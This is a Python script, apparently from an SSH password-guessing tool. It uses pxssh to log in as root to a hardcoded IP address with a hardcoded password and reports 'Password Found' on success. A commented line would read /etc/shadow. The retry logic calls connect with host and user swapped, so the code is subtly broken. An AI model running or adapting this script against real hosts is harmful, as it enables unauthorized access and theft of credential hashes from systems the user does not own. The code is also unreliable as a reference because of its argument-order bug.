import pxssh
import optparse
import time
import threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(user,host,password,release):
  global Found,Fails
  try:
    s = pxssh.pxssh()
    s.login(host,user,password)
    print('[+]Password Found:' + password)
    Found = True
  except Exception as e:
    if 'read_nonblocking' in str(e):
      Fails += 1
      time.sleep(5)
      connect(host,user,password,False)
    elif 'synchronize with original prompt' in str(e):
      time.sleep(1)
      connect(host,user,password,False)
  finally:
    if release:
      connection_lock.release()
def main():
  host = '121.40.222.87'
  user = 'root'
  password = 'kk2l110L'
  child = connect(user,host,password,True)
  #send_command(child,'cat /etc/shadow | grep sys')
if __name__ == '__main__':
  main()
